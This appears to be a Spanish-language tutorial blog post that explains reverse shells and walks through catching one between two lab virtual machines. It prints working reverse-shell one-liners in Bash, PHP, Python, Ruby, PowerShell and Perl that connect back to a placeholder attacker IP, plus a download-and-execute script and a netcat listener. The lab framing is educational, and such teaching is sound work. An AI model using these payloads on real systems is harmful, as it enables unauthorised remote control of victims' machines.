---
layout: post
title: Que es y como crear una reverse shell
subtitle: Explicando las reverse shells
cover-img: /assets/img/reverse-shell/icono.jpg
thumbnail-img: /assets/img/reverse-shell/icono.jpg
tags: [linux, fácil, reverse shell, explicación]
excerpt: "Las reverse shells nos permiten introducirnos en la máquina de la víctima haciendo que esta se conecte a nosotros. En este post vamos a ver que es una reverse shell, como crearla y como utilizarla en pruebas de penetración."
---



## ¿Qué es una reverse shell?

Una shell directa (bind shell) es una terminal de comandos que se conecta desde la máquina del atacante hacia la víctima. 
Una shell inversa (reverse shell), por el contrario, hace que el ordenador vulnerado se conecte al del hacker. Por lo tanto, una reverse shell, es un código malicioso que nos permite conectarnos a la víctima a través de la ejecución de este.

## Diferentes reverse shells en lenguajes de programación:

Bash:
```
bash -i >& /dev/tcp/IP/PUERTO 0>&1
```

PHP:
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_Atacante>/<PUERTO> 0>&1'"); ?>
```
Python:
```
export RHOST="IP";export RPORT=PUERTO;python3 -c 'import 
sys,socket,os,pty;s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for 
fd in (0,1,2)];pty.spawn("sh")'
```

Ruby:
```
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("IP",PUERTO))'
```

Powershell:
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object 
System.Net.Sockets.TCPClient("IP",PUERTO);$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) 
-ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, 
$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + 
(pwd).Path + "> ";$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,
$sendbyte.Length);$stream.Flush()};$client.Close()
```
Perl: 
```
perl -e 'use Socket;$i="IP";$p=PUERTO;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");
open(STDERR,">&S");exec("sh -i");};' 
```
<br>
Existen muchísimas más reverse shells, pero estas son las más utilizadas. Hay que tener en cuenta que no podemos escoger un puerto cualquiera, puesto que hay unos cuantos que requieren permisos de root. Los más utilizados son el 4444, 1234 y el 443.

## Conectándonos con una reverse shell a una máquina víctima:

El único requisito para poder hacer esto es tener dos máquinas virtuales kali linux (que sean kali linux es opcional).

El primer punto a tener en cuenta es que, vamos a usar una máquina víctima y una máquina de atacante, así que hay que decidir cuál es cuál. Una vez sabemos cuál es cuál vamos a empezar. En mi caso la IP de la máquina de atacante es 192.168.47.156, la IP de la máquina víctima es 192.168.47.139.

![](/assets/img/reverse-shell/IP1.png)

![](/assets/img/reverse-shell/IP2.png)


Lo siguiente que debemos hacer es seleccionar una reverse shell. En este caso vamos a utilizar una en bash. Vamos a hacer lo siguiente:

![](/assets/img/reverse-shell/rever1.png)

```
#!/bin/bash
bash -i >& /dev/tcp/IP/PUERTO 0>&1
```

Hemos creado un directorio para poder trabajar cómodamente. Después creamos el archivo llamado reverse.sh (podemos ponerle el nombre que queramos siempre que tenga la extensión .sh). Ahora vamos a abrir un servidor con python para que la máquina víctima se descargue y ejecute el archivo:

![](/assets/img/reverse-shell/rever2.png)


Lo siguiente es ir a la máquina víctima. Una vez ahí ponemos la IP del atacante en el navegador. Después nos descargarnos el archivo haciendo click en este:

![](/assets/img/reverse-shell/rever3.png)


Ahora vamos a la carpeta Descargas y le damos permisos de ejecución con chmod:

![](/assets/img/reverse-shell/rever4.png)


Lo siguiente es ejecutar la reverse shell, pero antes nos vamos a poner a la escucha en la máquina de atacante con el comando nc -lvnp 4444:

![](/assets/img/reverse-shell/rever5.png)

![](/assets/img/reverse-shell/rever6.png)


Ya tenemos acceso a la máquina víctima (tengo el mismo nombre de usuario en las dos máquinas).
Ahora podemos movernos libremente por el sistema. Le vamos a dejar un mensaje a la víctima:

![](/assets/img/reverse-shell/rever7.png)

![](/assets/img/reverse-shell/rever8.png)

<br>
<br>
Espero que os haya gustado y hayáis comprendido que es una reverse shell. Si tenéis alguna sugerencia podéis contactarme. <br>
Hasta la próxima!!!

